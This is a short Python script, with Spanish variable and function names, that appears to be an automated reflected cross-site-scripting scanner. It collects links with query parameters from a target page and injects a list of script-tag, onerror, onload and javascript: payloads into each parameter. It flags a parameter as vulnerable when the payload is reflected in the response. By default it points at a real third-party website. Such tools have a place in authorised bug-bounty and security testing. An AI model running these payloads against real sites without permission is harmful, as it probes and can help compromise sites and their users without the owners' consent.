import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
PAYLOADS = [
    "<script>alert('OPENBUGBOUNTY')</script>",
    "\"><script>alert('OPENBUGBOUNTY')</script>",
    "<img src=x onerror=alert('OPENBUGBOUNTY')>",
    "<svg onload=alert('OPENBUGBOUNTY')>",
    "javascript:alert('OPENBUGBOUNTY')"
]
TIMEOUT = 15
session = requests.Session()
session.trust_env = False

def extraer_parametros(url):
    try:
        r = session.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        enlaces = set()
        for a in soup.find_all('a', href=True):
            if '?' in a['href']:
                enlaces.add(requests.compat.urljoin(url, a['href']))
        return list(enlaces)
    except:
        return []

def probar_xss(url_original):
    parsed = urlparse(url_original)
    params = parse_qs(parsed.query)
    hallazgos = []
    for param_name in params:
        print(f"  [>] Probando: {param_name}")
        for payload in PAYLOADS:
            new_params = params.copy()
            new_params[param_name] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
            try:
                r = session.get(test_url, headers=HEADERS, timeout=TIMEOUT)
                if payload in r.text:
                    print(f"      [🔥] ¡VULNERABLE! {payload}")
                    hallazgos.append({"param": param_name, "url": test_url})
                    break
            except:
                pass
            time.sleep(0.5)
    return hallazgos

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "https://www.ecured.cu"
    target = target.rstrip('/')
    print(f"[*] Escaneando: {target}")
    enlaces = [target] if '?' in target else extraer_parametros(target)
    for e in enlaces[:10]:
        h = probar_xss(e)
        if h: print(f"\n[+] Hallazgos: {h}")

if __name__ == "__main__":
    main()